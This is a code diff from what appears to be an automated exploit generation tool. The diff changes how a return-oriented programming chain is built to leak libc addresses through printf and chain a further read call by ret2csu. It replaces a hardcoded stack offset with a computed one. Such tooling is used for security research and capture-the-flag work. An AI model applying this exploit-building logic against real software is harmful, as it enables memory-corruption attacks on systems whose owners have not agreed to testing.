@@ -145,24 +145,22 @@ GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
         BaseOffsetExpr::create(elf, "sym", "printf")
     };
 
-    // XXX: Don't hardcode the offset!
-    // p64(elf_base + pivot_dest + 8 + 0x30 * 18 + 32 - 8)
+    // Prepare to chain the current subchain with the next one by calling
+    // read(0, ropReadDstOffset, 0x400).
+    uint64_t read3Size = read1.size();
+    uint64_t ropReadDstOffset
+        = sizeof(uint64_t) * (read1.size() + read2.size() + prep.size() + leak.size() + read3Size);
+
     RopSubchain read3 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create(elf, "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
-        AddExpr::alloc(
-            BaseOffsetExpr::create(exploit, elf, "pivot_dest"),
-            AddExpr::alloc(
-                MulExpr::alloc(
-                    ConstantExpr::create(0x30, Expr::Int64),
-                    ConstantExpr::create(18, Expr::Int64)),
-                ConstantExpr::create(32, Expr::Int64))),
+        PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
         ConstantExpr::create(0x400, Expr::Int64))[0];
 
     RopSubchain part1;
     RopSubchain part2 = { ByteVectorExpr::create(fmtStr) };
 
-    part1.reserve(1 + read1.size() + read2.size() + prep.size() + leak.size());
+    part1.reserve(1 + read1.size() + read2.size() + prep.size() + leak.size() + read3.size());
     part1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
     part1.insert(part1.end(), read1.begin(), read1.end());
     part1.insert(part1.end(), read2.begin(), read2.end());
